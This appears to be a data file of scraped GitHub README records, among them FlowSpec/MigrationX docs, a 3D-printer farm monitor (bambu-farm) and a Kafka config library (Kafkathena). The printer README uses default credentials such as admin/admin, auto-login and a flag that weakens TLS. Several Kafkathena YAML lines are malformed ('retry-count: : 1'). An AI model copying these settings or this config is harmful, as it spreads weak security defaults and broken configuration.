| `parameters` | `Array<`[`Variable`](#variable)`>` | No       | list of parameter definitions used by script |

## Trigger

`Trigger` defines the rules of firing time of scheduled nodes.

### Fields

| Field Name  | Field Type | Required | Description                                                                                                     |
|:-----------:|:----------:|----------|-----------------------------------------------------------------------------------------------------------------|
|    `id`     |  `string`  | Yes      | local identifier in spec                                                                                        |
|   `type`    |  `string`  | Yes      | trigger type, values: `Scheduler`, `Manual`                                                                     |
|   `cron`    |  `string`  | No       | cron expression of `Scheudler` Trigger                                                                          | 
| `startTime` |  `string`  | No       | start effect time of `Scheduler` Trigger. nodes will only instanced time in range from `startTime` to `endTime` | 
|  `endTime`  |  `string`  | No       | end of effect time of `Scheduler` Trigger.                                                                      |
| `timezone`  |  `string`  | No       | timezone of the `Scheduler` Trigger                                                                             |

## Artifact

Artifacts can be types like `NodeOutput`, `Table`, `Variable`. `Variable` can be a context variable produced by workflow nodes.

### Table

| Field Name | Field Type | Required | Description         |
|:----------:|:----------:|----------|---------------------|
|   `guid`   |  `string`  | Yes      | table artifact guid |

### NodeOutput

| Field Name | Field Type | Required | Description                      |
|:----------:|:----------:|----------|----------------------------------|
|  `output`  |  `string`  | Yes      | output string identifier of node |

## RuntimeResource

`RuntimeResource` defines runtime resources config are used to run workflow nodes runtime resources, like: resource group, YARN cluster etc.

### Fields

|   Field Name    | Field Type | Required | Description                      |
|:---------------:|:----------:|----------|----------------------------------|
|      `id`       |  `string`  | Yes      | local identifier in spec         |
| `resourceGroup` |  `string`  | Yes      | resource group global identifier |

## FileResource

`FileResource` defines the resource files used by workflow nodes. like jar, python, text file, archive files etc.

### Fields

| Field Name |    Field Type     | Required | Description                 |
|:----------:|:-----------------:|----------|-----------------------------|
|    `id`    |     `string`      | Yes      | local identifier in spec    |
|   `name`   |     `string`      | Yes      | resource file name          |
|  `script`  | [Script](#script) | Yes      | resource file script define |

## Function

User-Define-Function definition that used by workflow nodes.

### Fields

|   Field Name    |                 Field Type                 | Required | Description                    |
|:---------------:|:------------------------------------------:|----------|--------------------------------|
|      `id`       |                  `string`                  | Yes      | local identifier in spec       |
|     `name`      |                  `string`                  | Yes      | name of udf                    |
|    `script`     |             [Script](#script)              | Yes      | script file of udf             |
| `fileResources` | `Array<`[`FileResource`](#fileResource)`>` | No       | list of related file resources |

## Runtime

`Runtime` define the runtime environment of script. like command, runtime engine, image etc.

### Fields

| Field Name | Field Type | Required | Description                                                |
|:----------:|:----------:|----------|------------------------------------------------------------|
|  `engine`  |  `string`  | No       | runtime engine                                             |
| `command`  |  `string`  | No       | command identifier of script runtime execution environment |

## Outputs

Outputs hold parameters, artifacts, and results from a workflow node, `Outputs` can be consumed by another workflow node.

### Fields

|  Field Name   |               Field Type               | Required | Description                                                                           |
|:-------------:|:--------------------------------------:|----------|---------------------------------------------------------------------------------------|
|   `tables`    |      `Array<`[`Table`](#table)`>`      | No       | `tables` are list of artifact tables produced by node                                 |
|  `variables`  |   `Array<`[`Variable`](#variable)`>`   | No       | `variables` are list of `Variable` produced by node                                   |
| `nodeOutputs` | `Array<`[`NodeOutput`](#nodeOutput)`>` | No       | `nodeOutputs` are list of pre-defined node output identifier strings produced by node |

## Inputs

Inputs are the mechanism for passing parameters, artifacts, volumes from one workflow node to another

### Fields

|  Field Name   |              Field Type              | Required | Description                                                                            |
|:-------------:|:------------------------------------:|----------|----------------------------------------------------------------------------------------|
|   `tables`    |   `Array<`[`Artifact`](#table)`>`    | No       | `tables` are a list of artifact tables passed as inputs                                |
|  `variables`  |  `Array<`[`Variable`](#variable)`>`  | No       | `variables` are a list of `Variable` passed as inputs                                  |
| `nodeOutputs` | `Array<`[`Artifact`](#nodeOutput)`>` | No       | `nodeOutputs` are a list of pre-defined node output identifier string passed as inputs |

## Enumerations

### VariableScope

|   Enum Name   | Description                                                                                    |
|:-------------:|------------------------------------------------------------------------------------------------|
| NodeParameter | `NodeParameter` means the variable is avaliable in a specific node                             |
|  NodeContext  | `NodeContext` means the variable is avaliable in downstream nodes that depends on current node |
|   Workflow    | `Workflow` means the variable is avaliable in all nodes that in current workflow               |
|   Workspace   | `Workspace` means the variable is avaliable in all nodes that in current workspace             |
|    Tenant     | `Tenant` means the variable is avaliable in all nodes that in current tenant workspaces        |

### VariableType

| Enum Name | Description                                                                  |
|:---------:|------------------------------------------------------------------------------|
|  System   | `System` means the variable is avaliable a system variable like: `$yyyymmdd` |
| Constant  | `Constant` means the variable is constant value                              |

### DependencyType

|          Enum Name           | Description                                                                                                                                             |
|:----------------------------:|---------------------------------------------------------------------------------------------------------------------------------------------------------|
|            Normal            | `Normal` means the node instance of current cycle instance depends on the specific node instance in the same cycle round                                |
|   CrossCycleDependsOnSelf    | `CrossCycleDependsOnSelf` means the current cycle instance of the node depends on the previous cycle round instance of the node itself                  |
| CrossCycleDependsOnChildren  | `CrossCycleDependsOnChildren` means the current cycle instance of the node depends on the children instance of itself in the previous cycle round       |
| CrossCycleDependsOnOtherNode | `CrossCycleDependsOnOtherNode` means the current cycle instance of the node depends on the specific node instance of itself in the previous cycle round |

### Recurrence

| Enum Name | Description                                                                                                         |
|:---------:|---------------------------------------------------------------------------------------------------------------------|
|  Normal   | `Normal` means node instance code will be executed as defined repeat cycle, node will be instanced by defined cycle |
|   Skip    | `Skip` means node instance will be set success without any code effects, node will be instanced by defined cycle    |
|   Pause   | `Pause` means node instance will be set failure without any code effects, node will be instanced by defined cycle   |

### RerunMode

|   Enum Name    | Description                                                         |
|:--------------:|---------------------------------------------------------------------|
|    Allowed     | `Allowed` means node instance can be rerun without any precondition |
|     Denied     | `Denied` means node instance cannot be rerun on any condition       |
| FailureAllowed | `FailureAllowed` means node instance can be rerun on failure state  |

### InstanceMode

|  Enum Name  | Description                                                              |
|:-----------:|--------------------------------------------------------------------------|
|     T+1     | `T+1` means node modification will be applied effect on the next day     |
| Immediately | `Immediately` means node modification will be applied effect immediately |    

# FlowSpec Examples

FlowSpec can be used to describe a workflow, it is a json file that contains a list of nodes.

## real case

### EMR/CDH case

* EMR: [yaml](./spec/src/main/spec/examples/yaml/emr.yaml) [json](./spec/src/main/spec/examples/json/emr.json)
* CDH: [yaml](./spec/src/main/spec/examples/yaml/cdh.yaml) [json](./spec/src/main/spec/examples/json/cdh.json)

### example without id variables references

* [yaml](./spec/src/main/spec/examples/yaml/real_case_expanded.yaml)
* [json](./spec/src/main/spec/examples/json/real_case_expanded.json)

### example with id variables references

* [yaml](./spec/src/main/spec/examples/yaml/real_case.yaml)
* [json](./spec/src/main/spec/examples/json/real_case.json)

## simple example

* [yaml](./spec/src/main/spec/examples/yaml/simple.yaml)
* [json](./spec/src/main/spec/examples/json/simple.json)

## branch node

* [yaml](./spec/src/main/spec/examples/yaml/branch.yaml)
* [json](./spec/src/main/spec/examples/json/branch.json)

## join node

* [yaml](./spec/src/main/spec/examples/yaml/join.yaml)
* [json](./spec/src/main/spec/examples/json/join.json)

## for-each/do-while node

* [yaml](./spec/src/main/spec/examples/yaml/innerflow.yaml)
* [json](./spec/src/main/spec/examples/json/innerflow.json)

## manual workflow

* [yaml](./spec/src/main/spec/examples/yaml/manual_flow.yaml)
* [json](./spec/src/main/spec/examples/json/manual_flow.json)

## emr nodes

* [yaml](./spec/src/main/spec/examples/yaml/script_runtime_template.yaml)
* [json](./spec/src/main/spec/examples/json/script_runtime_template.json)

## resource example

* [yaml](./spec/src/main/spec/examples/yaml/file_resource.yaml)
* [json](./spec/src/main/spec/examples/json/file_resource.json)

## function example

* [yaml](./spec/src/main/spec/examples/yaml/function.yaml)
* [json](./spec/src/main/spec/examples/json/function.json)

## param-hub node

* [yaml](./spec/src/main/spec/examples/yaml/parameter_node.yaml)
* [json](./spec/src/main/spec/examples/json/parameter_node.json)

# FlowSpec example

## DataWorks migration assistant spec package demo

* the directory structure of the spec package is consistent with the directory tree of the DataWorks DataStudio business process interface
* *.sql, *.sh, *.hql are user script source files
* *.flow is the spec file corresponding to the user script source file

```shell
➜  project_c_dw tree
.
└── Business Flow
    ├── project_c_dag_3zq3ei4d6
    │   └── ClickHouse
    │       └── Data Analytics
    │           ├── clickhouse_sql_1.flow
    │           └── clickhouse_sql_1.sql
    └── project_c_demo_workflow_1
        ├── EMR
        │   └── Data Analytics
        │       ├── demo_hive_sql_1.flow
        │       ├── demo_hive_sql_1.hql
        │       ├── demo_pg_sql_1.flow
        │       ├── demo_pg_sql_1.hql
        │       ├── demo_shell_1.flow
        │       ├── demo_shell_1.sh
        │       ├── demo_sql_1.flow
        │       └── demo_sql_1.hql
        └── General
            ├── dep_ck_1
            └── dep_ck_1.flow
```

![DataWorks Migration Package FlowSpec example](docs/images/spec/dw_spec_package_demo-en.jpg)

# FlowSpec Client Tool

MigrationX is a workflow model transformation tool based on FlowSpec.

* [MigrationX](docs/migrationx/index.md)
    * Dolphinscheduler migrate to Dataworks DataStudio in one-click command run
    * Dolphinscheduler export command tool
    * Conversion dolphinscheduler workflow to DataWorks FlowSpec
    * Import FlowSpec package to DataWorks DataStudio with DataWorks OpenAPI

## Architecture

![image](docs/images/architecture-en.jpg)

### Domain Model

Define domain model for different workflow engine, containing domain entities and corresponding operation service

### Reader

Implementations of export reader tools for specific workflow engine.

### Transformer

Implementations of transformation logics between specific workflow engines.

### Writer

Implementations of import writer tools for specific workflow engine.

### Usage

[Usage](docs/migrationx/usage.md)

# Modules

* migrationx-common: common module
* migrationx-domain: domain model of specific workflow engine
* migrationx-reader: export reader implementation of specific workflow engine
* migrationx-transformer: transformer implementation of specific workflow engine
* migrationx-writer: import write implementation of specific workflow engine

# Develop guide

[Develop guide](docs/dev/develop-guide.md)

# Contributors

* Alibaba Cloud-DataWorks-Develop & Modeling & Analytics Team
",0,2,21,apache-2.0,13.0
Lord-of-Algorithms/DSA-in-Java,main,"# DSA in Java
This repository supplements a mobile app on algorithm and data structure visualization, providing code for the concepts demonstrated in the app. It's an essential resource for users seeking to understand and explore these implementations in detail.

## Contributing

While this project is open-source, it is not currently seeking contributions. You are welcome to fork and use the code according to the license, but please note that contributions or pull requests to this repository will not be accepted.

## Installation and Setup

To clone and run these examples locally, follow these steps:

```
git clone https://github.com/Lord-of-Algorithms/DSA-in-Java.git
```

## Usage

To run an example, navigate to the corresponding file and execute it using your Java environment:

```
cd DSA-in-Java/src/binarytree
javac BinarySearchTreeMain.java
java BinarySearchTreeMain.java
```

## License

This project is licensed under the MIT License. See the LICENSE file for more details.

## About the Mobile App

This repository is a supplement to our mobile app ""Algorithms and Data Structures"", which offers interactive visualizations of algorithms and data structures. Learn more about the app: [App Store](https://apps.apple.com/us/app/algorithms-data-structures/id1484525469), [Google Play](https://play.google.com/store/apps/details?id=com.iov.lordofalgorithms).
",0,0,1,mit,0.0
agents-flex/agents-flex,main,,4,3,1,apache-2.0,4.0
TFyre/bambu-farm,main,"# Cannot print with latest firmware
> [!IMPORTANT]  
> https://wiki.bambulab.com/en/p1/manual/p1p-firmware-release-history
>
> Bambulab decided to block printing via MQTT unless you enable lanmode only.
>
> Consider downgrading firmware Reference [!142](https://github.com/TFyre/bambu-farm/issues/142)
>
> **OR**
>
> Check the [Cloud Section](#cloud-section) about enabling cloud mode


# Bambu Farm
[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/tfyre)


Web based application to monitor multiple bambu printers using mqtt / ftp / rtsp (**no custom firmware required**)

Technologies used:
* Java 21 https://www.azul.com/
* Quarkus https://quarkus.io/
* Vaadin https://vaadin.com/

# Features / Supported Devices

| Feature | A1 | A1 Mini | P1P | P1S | X1C|
|--|:--:|:--:|:--:|:--:|:--:|
|**Remote View**|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] <sup>3</sup></li></ul>|
|**Upload to SD card**|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] <sup>2</sup></li></ul>|
|**Print .3mf from SD card**<sup>1</sup>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] <sup>2</sup></li></ul>|
|**Print .gcode from SD card**|?|?|?|?|?|
|**Batch Printing**<sup>4</sup>|?|?|?|<ul><li>[x] </li></ul>|<ul><li>[x] <sup>2</sup></li></ul>|
|**AMS**|?|?|?|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|
|**Send Custom GCode**|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|

1. **Currently only .3mf sliced projects are supported.**
  > In Bambu Studio/Orca slicer, make sure to slice the place and then use the ""File -> Export -> Export plate sliced file"". This creates a `.3mf` project with embedded `.gcode` plate.
2. **FTPS Connections needs SSL Session Reuse via [Bouncy Castle](#bouncy-castle)**
> Without enabling bouncy castle, you will see `552 SSL connection failed: session resuse required`
3. Getting the **LiveView** to work requires additional software. For more details check the [docker/bambu-liveview](docker/bambu-liveview) README.
4. **Batch Priting** allows you to upload a single/multi sliced .3mf and select which plate to send to multiple printers, each with their own filament mapping.

# Screenshots

* Dashboard
![Desktop browser](/docs/bambufarm1.jpg)
* Batch printing
![Batch Printing](/docs/batchprint.png)

*More screenshots in [docs](/docs)*

# I just want to run it

* Make sure you have Java 21 installed, verify with `java -version`
```bash
[user@build:~]# java -version
openjdk version ""21.0.1"" 2023-10-17 LTS
OpenJDK Runtime Environment Zulu21.30+15-CA (build 21.0.1+12-LTS)
OpenJDK 64-Bit Server VM Zulu21.30+15-CA (build 21.0.1+12-LTS, mixed mode, sharing)
```
* Download the latest `bambu-web-*-runner.jar` from [releases](https://github.com/TFyre/bambu-farm/releases/latest) into a new folder (or use the 1 liner below):
```bash
curl -s https://api.github.com/repos/tfyre/bambu-farm/releases/latest \
  | grep browser_download_url | cut -d'""' -f4 | xargs curl -LO
```
* Create a `.env` config file from [Minimal Config](#minimal-config)
  * *Check out the [Full Config Options](#full-config-options) section if you want to tweak some settings*
* Run with `java -jar bambu-web-x.x.x-runner.jar`
```bash
[user@build:~]# java -jar bambu-web-1.0.1-runner.jar
__  ____  __  _____   ___  __ ____  ______
 --/ __ \/ / / / _ | / _ \/ //_/ / / / __/
 -/ /_/ / /_/ / __ |/ , _/ ,< / /_/ /\ \
--\___\_\____/_/ |_/_/|_/_/|_|\____/___/
2024-01-23 08:49:05,586 INFO  [io.und.servlet] (main) Initializing AtmosphereFramework
...
...
2024-01-23 08:49:05,666 INFO  [com.vaa.flo.ser.DefaultDeploymentConfiguration] (main) Vaadin is running in production mode.
2024-01-23 08:49:05,912 INFO  [org.apa.cam.qua.cor.CamelBootstrapRecorder] (main) Bootstrap runtime: org.apache.camel.quarkus.main.CamelMainRuntime
2024-01-23 08:49:05,913 INFO  [org.apa.cam.mai.MainSupport] (main) Apache Camel (Main) 4.2.0 is starting
...
...
2024-01-23 08:49:06,029 INFO  [com.tfy.bam.cam.CamelController] (main) configured
2024-01-23 08:49:06,074 INFO  [org.apa.cam.imp.eng.AbstractCamelContext] (main) Apache Camel 4.2.0 (camel-1) is starting
2024-01-23 08:49:06,081 INFO  [org.apa.cam.imp.eng.AbstractCamelContext] (main) Routes startup (total:10 started:0 disabled:10)
...
...
2024-01-23 08:49:06,085 INFO  [org.apa.cam.imp.eng.AbstractCamelContext] (main) Apache Camel 4.2.0 (camel-1) started in 10ms (build:0ms init:0ms start:10ms)
2024-01-23 08:49:06,193 INFO  [io.quarkus] (main) bambu-web 1.0.1 on JVM (powered by Quarkus 3.6.6) started in 1.421s. Listening on: http://0.0.0.0:8084
2024-01-23 08:49:06,194 INFO  [io.quarkus] (main) Profile prod activated.
2024-01-23 08:49:06,194 INFO  [io.quarkus] (main) Installed features: [camel-core, camel-direct, camel-paho, cdi, resteasy-reactive, resteasy-reactive-jackson, 
scheduler, security, servlet, smallrye-context-propagation, vaadin-quarkus, vertx, websockets, websockets-client]
```
* If starting correctly, it will show `Routes startup (total:10 started:0 disabled:10)` with a number that is 2x your printer count
* Head over to http://127.0.0.1:8080 and log in with `admin` / `admin`

# Building & Running

Building:
```bash
mvn clean install -Pproduction
```

Create a new directory and copy `bambu/target/bambu-web-1.0.0-runner.jar` into it, example:
```bash
tfyre@fsteyn-pc:/mnt/c/bambu-farm$ ls -al
total 64264
drwxrwxrwx 1 tfyre tfyre     4096 Jan 17 16:47 .
drwxrwxrwx 1 tfyre tfyre     4096 Jan 18 20:42 ..
-rw-rw-rw- 1 tfyre tfyre     4557 Jan 18 14:01 .env
-rw-rw-rw- 1 tfyre tfyre 65796193 Jan 18 20:38 bambu-web-1.0.0-runner.jar
```

Running
```bash
java -jar bambu-web-1.0.0-runner.jar
```

You can now access it via http://127.0.0.1:8080 (username: admin / password: admin)

# Running as a service

Refer to [README.service.md](/docs/README.service.md)

# Example Config

## Minimal config

**!!Remeber to replace `REPLACE_*` fields!!**

Create an `.env` file with  the following config:
```properties
quarkus.http.host=0.0.0.0
quarkus.http.port=8080

bambu.printers.myprinter1.device-id=REPLACE_WITH_DEVICE_SERIAL
bambu.printers.myprinter1.access-code=REPLACE_WITH_DEVICE_ACCESSCODE
bambu.printers.myprinter1.ip=REPLACE_WITH_DEVICE_IP

bambu.users.admin.password=admin
bambu.users.admin.role=admin
```

## Full Config Options

**All default options are displayed (only add to the config if you want to change)**

### Dark Mode
```properties
# Gobal
bambu.dark-mode=false
# Per user (will default to global if omitted)
bambu.users.myUserName.dark-mode=false
```

### Printer section
```properties
bambu.printers.myprinter1.enabled=true
bambu.printers.myprinter1.name=Name With Spaces
bambu.printers.myprinter1.device-id=REPLACE_WITH_DEVICE_SERIAL
bambu.printers.myprinter1.username=bblp
bambu.printers.myprinter1.access-code=REPLACE_WITH_DEVICE_ACCESSCODE
bambu.printers.myprinter1.ip=REPLACE_WITH_DEVICE_IP
bambu.printers.myprinter1.use-ams=true
bambu.printers.myprinter1.timelapse=true
bambu.printers.myprinter1.bed-levelling=true
bambu.printers.myprinter1.flow-calibration=true
bambu.printers.myprinter1.vibration-calibration=true
bambu.printers.myprinter1.model=unknown / a1 / a1mini / p1p / p1s / x1c
bambu.printers.myprinter1.mqtt.port=8883
bambu.printers.myprinter1.mqtt.url=ssl://${bambu.printers.myprinter1.ip}:${bambu.printers.myprinter1.mqtt.port}
bambu.printers.myprinter1.mqtt.report-topic=device/${bambu.printers.myprinter1.device-id}/report
bambu.printers.myprinter1.mqtt.request-topic=device/${bambu.printers.myprinter1.device-id}/request
#Requesting full status interval
bambu.printers.myprinter1.mqtt.full-status=10m
bambu.printers.myprinter1.ftp.port=990
bambu.printers.myprinter1.ftp.url=ftps://${bambu.printers.myprinter1.ip}:${bambu.printers.myprinter1.ftp.port}
bambu.printers.myprinter1.ftp.log-commands=false
bambu.printers.myprinter1.stream.port=6000
bambu.printers.myprinter1.stream.live-view=false
bambu.printers.myprinter1.stream.url=ssl://${bambu.printers.myprinter1.ip}:${bambu.printers.myprinter1.stream.port}
#Restart stream if no images received interval
bambu.printers.myprinter1.stream.watch-dog=5m
```

### Cloud Section

Enable MQTT connection via cloud instead of directly to printer. You can either provide the username/password or a access token.

* Option 1 - username/password

Provide the username and password for https://bambulab.com/ in the format below

* Option 2 - access token

The access token can be fetched from your browser cookies or a 1 liner curl
```bash
curl -v -X POST -H 'Content-Type: application/json' -d '{""account"":""YOUR_USER_NAME"",""password"":""YOUR_PASSWORD""}' https://bambulab.com/api/sign-in/form 2>&1 | grep token= | awk '{print$3}'
```

Configuration:

```properties
bambu.cloud.enabled=true

# Option1: Let bambufarm login and fetch token
bambu.cloud.login.username=YOUR_LOGIN_USER
bambu.cloud.login.password=YOUR_LOGIN_PASSWORD

# Option2: fetch token via curl and paste here
bambu.cloud.token=FULL_JWT_TOKEN_FROM_COOKIES
```

### User Section

**Remember to encrypt your passwords with bcrypt (eg https://bcrypt-generator.com/)**

Current roles supported:

* `admin` - full access
* `normal` - only dashboard with readonly access

```properties
# https://bcrypt-generator.com/
#bambu.users.REPLACE_WITH_USERNAME.password=REPLACE_WITH_PASSWORD

# Insecure version:
#bambu.users.myUserName.password=myPassword
# Secure version:
bambu.users.myUserName.password=$2a$12$GtP15HEGIhqNdeKh2tFguOAg92B3cPdCh91rj7hklM7aSOuTMh1DC 
bambu.users.myUserName.role=admin
bambu.users.myUserName.dark-mode=false

#Guest account with readonly role
bambu.users.guest.password=guest
bambu.users.guest.role=normal

# Skip users and automatically login as admin (default: false)
bambu.auto-login=true
```

### Preheat

Default preheat configuration is below:
```properties
bambu.preheat[0].name=Off 0/0
bambu.preheat[0].bed=0
bambu.preheat[0].nozzle=0
bambu.preheat[1].name=PLA 55/220
bambu.preheat[1].bed=55
bambu.preheat[1].nozzle=220
bambu.preheat[2].name=ABS 90/270
bambu.preheat[2].bed=90
bambu.preheat[2].nozzle=270
```

### Remote View

Remote View is the ability to remotely view or stream the printer's camera.

```properties
# defaults to true, when false, disables remote view globally
bambu.remote-view=true

# defaults to true, when false, disables remote view for dashboard, but will still be available in detail view
bambu.dashboard.remote-view=true

# defaults to true, when false, disables per printer
bambu.printers.myprinter1.stream.enable=true
```


### Live View

Live View is the ability to remotely stream the X1C camera (or any other webcam) and requires Remote View to be enabled.

> [!NOTE]
> Getting the **LiveView** to work requires additional software. For more details check the [docker/bambu-liveview](docker/bambu-liveview) README.


```properties
bambu.live-view-url=/_camerastream/

# For each printer:
bambu.printers.PRINTER_ID.stream.live-view=true

# Default LiveView URL
bambu.printers.PRINTER_ID.stream.url=${bambu.live-view-url}${PRINTER_ID}

# Custom LiveView URL
bambu.printers.PRINTER_ID.stream.url=https://my_stream_domain.com/mystream
# 
```


### Bouncy Castle
`X1C` needs SSL Session Reuse so that SD Card functionality can work. Reference: https://stackoverflow.com/a/77587106/23289205

Without this you will see `552 SSL connection failed: session resuse required`.

Add to `.env`:
```properties
bambu.use-bouncy-castle=true
```
Add JVM startup flag:

bash / cmd:
```bash
java -Djdk.tls.useExtendedMasterSecret=false -jar bambu-web-x.x.x-runner.jar
```

powershell:
```powershell
java ""-Djdk.tls.useExtendedMasterSecret=false"" -jar bambu-web-x.x.x-runner.jar
```

### Uploading bigger files

Add to `.env`:
```properties
quarkus.http.limits.max-body-size=30M
```

### Configure XY/Z movement speeds

Add to `.env`:
```properties
# values are in mm/minute
bambu.move-xy=5000
bambu.move-z=3000
```

### Use Right click for menus

Add to `.env`:
```properties
bambu.menu-left-click=false
```

### Custom CSS

If you want to modify the CSS, create a file next to the `.jar` file called `styles.css`

* Changing the display columns

*Display columns is a ratio and scale based on screen width*

Refer to [bambu.css](/bambu/frontend/themes/bambu-theme/bambu.css#L1-L25)

| Example | value for XXX |
| -- | -- |
| always 1 column | 1 |
| 2 columns with 1080p | 3 |
| 4 columns with 1080p | 5 |

```css
:root {
  --bambu-default-columns: XXX;
}
```

# Debug

For debugging the application, add the following to .env and uncomment DEBUG or TRACE logging sections

```properties
### Log To File
quarkus.log.file.enable=true
quarkus.log.file.path=application.log


### DEBUG logging
#quarkus.log.category.""com.tfyre"".level=DEBUG


### TRACE logging
#quarkus.log.min-level=TRACE
#quarkus.log.category.""com.tfyre"".min-level=TRACE
#quarkus.log.category.""com.tfyre"".level=TRACE
```

# Links

## Inspirational Web interface

* https://github.com/davglass/bambu-farm/tree/main

## Printer MQTT Interface

* https://github.com/Doridian/OpenBambuAPI/blob/main/mqtt.md
* https://github.com/xperiments-in/xtouch/blob/main/src/xtouch/device.h
* https://github.com/SoftFever/OrcaSlicer/blob/main/src/slic3r/GUI/DeviceManager.hpp

## Remoteview

* https://github.com/bambulab/BambuStudio/issues/1536#issuecomment-1811916472


## Images from

* https://github.com/SoftFever/OrcaSlicer/tree/main/resources/images

## Json to Proto

* https://json-to-proto.github.io/
* https://formatter.org/protobuf-formatter
",14,28,4,apache-2.0,12.0
Trendyol/kafkathena-jakarta,master,"<div id=""top""></div>
<p align=""center"">
<img src=""docs/images/kafkathena_logo.png"" width=""250"" alt=""Kafkathena""/>
</p>

<h1 align=""center"">Smart, Fast, Customizable Consumer Configurations</h1>

<p align=""center"">
<a href=""https://github.com/Trendyol/kafkathena-commons/blob/next/LICENSE"">
    <img src=""https://img.shields.io/github/v/release/Trendyol/kafkathena-commons"" alt=""Release"" />
  </a>
<a href=""https://img.shields.io/badge/spring%20boot-2.x%7C3.x-orange"">
    <img src=""https://img.shields.io/badge/spring%20boot-2.x%7C3.x-orange"" alt=""License"" />
  </a>
  <a href=""https://github.com/Trendyol/kafkathena-commons/blob/next/LICENSE"">
    <img src=""https://img.shields.io/github/license/trendyol/baklava"" alt=""Spring Boot Version"" />
  </a>
</p>

<!-- ABOUT THE PROJECT -->
## About The Project

There are many great kafka configurations libraries; however, we didn't find one that really suited our needs so we created this enhanced one. Kafkathena provided by [Trendyol](https://github.com/trendyol)

Here's why:
* Your time should be focused on creating only consumer business. This library that solves a kafka configuration time complexity on your projects.
* Add as dependency, create consumer/producer configs, create consumer class and go!

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

<!-- Features -->
## Features

* Config as a consumer and producers
* Consumer Acknowledge Customize Support
* Multiple Kafka Cluster Support
* Failover Error Topic and Custom Class Implementation
* Fixed Retry and Exponential Retry Support
* Consumer base ignore exceptions in failover
* Single Error Topic With Multiple Consumers
* Single Error Topic With Header Key Listening
* Filtered Consume Message
* Seperated Consume and Error Cluster
* Avro/Protobuffer Deserializer Support
* Authentication Base Cluster Support
* Kafka Message Sender Utility
* Spring 2.x/3.x, JDK 11/17 Support

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

<!-- Build With -->
### Built With

This section should list any major frameworks/libraries used to bootstrap your project. Leave any add-ons/plugins for the acknowledgements section. Here are a few examples.

* [Spring Starter 3+]
* [Spring Kafka Starter]
* [Jdk 17]

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

<!-- GETTING STARTED -->
## Getting Started

This is an example of how you may give instructions on setting up your project locally.
To get a local copy up and running follow these simple example steps.

### Prerequisites

This is an example of how to list things you need to use the software and how to install them.
* Maven 3+
* Jdk 17

### Installation
1. Copy and paste this inside your pom.xml dependencies block.
```xml
<dependency>
  <groupId>com.trendyol</groupId>
  <artifactId>kafkathena-jakarta</artifactId>
  <version>RELEASE</version>
</dependency>
```

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

<!-- USAGE EXAMPLES -->
## Usage

1. Add kafkathena
1. Add $`\textcolor{red}{\text{@EnableKafkathena}}`$ annotation as a configuration on SpringBoot Application
2. Create kafkathena config.yml

```
kafkathena:
  shared-factory-props:
    producer:
      interceptor: ""com.trendyol.mpc.kafkathena.commons.interceptor.KSProducerInterceptor""
    consumer:
      interceptor: ""com.trendyol.mpc.kafkathena.commons.interceptor.KSConsumerInterceptor""
      autoStartup: true
      missingTopicAlertEnable: false
      concurrency: 1
      syncCommitTimeoutSecond: 5
      syncCommit: true
      batch: false
      ackMode: RECORD
    clusters:
      ""[confluent]"":
        servers: localhost:9092
    
  producers:
    default:
      cluster: confluent
      props:
        ""[batch.size]"": 16384
        ""[linger.ms]"": 0
        ""[buffer.memory]"": 33554432
        ""[key.serializer]"": org.apache.kafka.common.serialization.StringSerializer
        ""[value.serializer]"": org.springframework.kafka.support.serializer.JsonSerializer
        ""[acks]"": ""1""
        ""[request.timeout.ms]"": 30000
  consumers:
    ""[consumer-one]"":
      type: JSON # AVRO/PROTO/JSON it can be empty
      topic: kafkathena.topic.one
      factory-bean-name: consumerOneKafkaListenerContainerFactory
      data-class: com.trendyol.kafkathena.demo.model.ConsumerOneMessage
      error-producer-name: default
      cluster: confluent
      filter-header:
        error-producer-filter-key: one-filter
        consumer-filter-key: one-filter
      failover:
        error-topic: kafkathena.topic.error
        handler-bean-name: defaultConsumerFailoverHandler
      fixed-retry:
        retry-count: 1
        backoff-interval-millis: : 5000 #wait time for retry
      exponential-retry:
        retry-count: : 1
        multiplier: 2
        maxInterval: 5
        backoff-interval-millis: : 1000
      factory-props:
        auto-startup: : true
        missing-topic-alert-enable: : false
        concurrency: 1
        sync-commit-timeout-second: : 5
        sync-commit: : true
        ack-mode: : RECORD
        interceptor-class-path: : com.trendyol.kafkathena.demo.interceptor.KafkaConsumerInterceptor
      props:
        ""[group.id]"": kafkathena.topicOneGroup
        ""[value.deserializer]"": org.springframework.kafka.support.serializer.ErrorHandlingDeserializer
        ""[spring.deserializer.value.delegate.class]"": org.springframework.kafka.support.serializer.JsonDeserializer
        ""[key.deserializer]"": org.springframework.kafka.support.serializer.ErrorHandlingDeserializer
        ""[spring.deserializer.key.delegate.class]"": org.apache.kafka.common.serialization.StringDeserializer
        ""[max.poll.records]"": 100
        ""[max.poll.interval.ms]"": 300000
        ""[session.timeout.ms]"": 300000
        ""[heartbeat.interval.ms]"": 3000
        ""[enable.auto.commit]"": true
        ""[auto.offset.reset]"": earliest
        ""[fetch.max.bytes]"": 52428800
        ""[fetch.max.wait.ms]"": 500
```
```
@Component
@DependsOnKafkathena
public class ConsumerOne {

    @KafkaListener(
            topics = ""${kafkathena.consumers[consumer-one].topic}"",
            groupId = ""${kafkathena.consumers[consumer-one].props[group.id]}"",
            containerFactory = ""${kafkathena.consumers[consumer-one].factory-bean-name}""
    )
    public void consume(@Payload ConsumerOneMessage message) {

    }
}
```

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

",1,0,1,mit,0.0
fangyi1008/pri_cloud,main,"# pri_cloud
私有云管平台

有兴趣完善该服务的可以加qq群：667403870


需要安装noVNC
./run --web /fyCloud/vm/vnc/noVNC-master --cert self.pem --token-plugin TokenFile --token-source /fyCloud/vm/vnc/noVNC-master/utils/websockify/token/ 6080
